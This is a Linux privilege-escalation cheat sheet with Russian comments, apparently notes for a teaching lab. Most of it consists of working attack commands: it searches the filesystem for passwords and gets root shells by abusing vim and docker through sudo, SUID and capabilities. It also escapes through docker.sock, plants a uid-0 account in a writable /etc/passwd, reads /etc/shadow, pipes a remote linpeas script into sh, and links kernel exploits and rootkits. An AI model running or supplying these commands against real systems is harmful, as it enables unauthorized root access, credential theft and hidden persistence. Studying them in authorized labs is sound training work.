#Эскалация привелегий это методика повышения текущих прав пользователя - до более высоких.
#В самом простом случае: у вас есть ограниченная учетная запись и путем манипуляций с плохо 
# настроенными правами (misconfig) или с помощью эксплоитов и тд, вы повышаете свои права до root.
# В чуть более сложном примере у вас есть все та же ограниченная учетка, но вы повышаете привелегии не до root, 
# а до учетки с более высоки правами, а уже от нее до root.

# groups
groups

# useful tools
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null




# поищем пароли на системе
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# crontab
crontab -l
ls -la /etc/ | grep cron
ls -la  /etc/cron*
cat /etc/cron*


# sudo
sudo -l
sudo -i
sudo visudo
sudo update-alternatives --config editor
sudo visudo
test    ALL=(root) /bin/bash

su test
sudo -l
sudo bash -p

# suid
find / -perm -4000
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

gtfo bins

# vim
# suid
sudo apt install python3
sudo install -m =xs $(which vim) .
./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

#sudo
which vim
sudo visudo
test ALL=(root) /usr/bin/vim
:wq
su test
sudo vim -c ':!/bin/sh'

#capabilities
cp $(which vim) vim2
sudo setcap cap_setuid+ep vim2
./vim2 -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'


# docker
install docker

#suid
cd ~
sudo install -m =xs $(which docker) .
./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
useradd test1
passwd test1
usermod -aG sudo test1
^D
cat /etc/passwd
sudo cat /etc/shadow
su test1
sudo -i
^D
groups


#sudo 
sudo visudo
test    ALL=(root) /bin/bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
useradd test2
passwd test2
sudo visudo
test2 ALL=(ALL:ALL) ALL
:wq
^D
su test2
sudo -i

#docker group
sudo usermod -aG docker test
su test
docker version
^D
usermod -G "" test
su test
docker version

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

#docker.sock
docker version
sudo chmod 666 /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

#writable passwd
la -ls /etc/passwd | grep passwd
vim /etc/passwd
hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
su hacker

# версия ядра
(cat /proc/version || uname -a ) 2>/dev/null

lsb_release -a 2>/dev/null

cat /etc/os-release 2>/dev/null

#чекаем какие есть уязвимости

echo $PATH
(env || set) 2>/dev/null


#эксплоиты уровня ядра
https://www.exploit-db.com/searchsploit

https://www.exploit-db.com
https://gitlab.com/exploit-database/exploitdb
https://gitlab.com/exploit-database/exploitdb-bin-sploits
https://github.com/lucyoa/kernel-exploits
https://github.com/notselwyn/cve-2024-1086


# Tools чек системы на эксплуатабельность
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
sudo chmod +x les.sh
./les.sh

wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/refs/heads/master/linux-exploit-suggester-2.pl -O les2.pl
sudo chmod +x les2.pl
./les2.pl

curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh



# Rootkits
https://github.com/m0nad/Diamorphine
https://github.com/f0rb1dd3n/Reptile/

# software CVE
#check software 
dpkg -l



# Полезные ссылки


https://exploit.education